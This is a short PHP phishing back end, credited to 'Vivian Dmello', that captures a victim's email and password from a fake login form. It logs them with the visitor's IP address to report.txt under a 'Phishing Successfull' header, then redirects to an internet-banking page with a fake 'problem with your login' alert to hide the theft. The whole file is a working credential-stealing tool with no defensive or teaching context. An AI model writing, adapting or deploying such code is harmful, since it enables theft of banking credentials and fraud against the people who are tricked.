<?php
/*                                             (                                      
                                             )\ )                    (    (         
 (   (    (      )     (       )            (()/(       )       (    )\   )\        
 )\  )\   )\    /((    )\   ( /(    (        /(_))     (       ))\  ((_) ((_)   (   
((_)((_) ((_)  (_))\  ((_)  )(_))   )\ )    (_))_      )\  '  /((_)  _    _     )\  
\ \ / /   (_)  _)((_)  (_) ((_)_   _(_/(     |   \   _((_))  (_))   | |  | |   ((_) 
 \ V /    | |  \ V /   | | / _` | | ' \))    | |) | | '  \() / -_)  | |  | |  / _ \ 
  \_/     |_|   \_/    |_| \__,_| |_||_|     |___/  |_|_|_|  \___|  |_|  |_|  \___/ 
                                                                                    */
$name = $_REQUEST['Email'];         //NameField <input type=text name=Email>
$passsword = $_REQUEST['Passwd'];   //Password Field <input type=password name=Passwd>
$ip=0;
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
date_default_timezone_set('Asia/Kolkata');
$res = "#####Phishing Successfull:".date('d-m-Y H:i')."################\r\n";
$res = $res."IP = ".$ip."\r\n" ;
$res = $res."UserName = ".$name."\r\n";
$res = $res."Password =  ".$passsword."\r\n##########################################################\r\n";
$file = fopen('report.txt','a');
fwrite($file,$res);
fclose($file); // Page to be redirected will come below
echo "<script>window.location.href ='http://www.xyz.com/Personal-Banking/insta-banking/internet-banking/index.page';alert('There was a problem with your login try again')</script>";
/*                                             (                                      
Created By Vivian Dmello*/
?>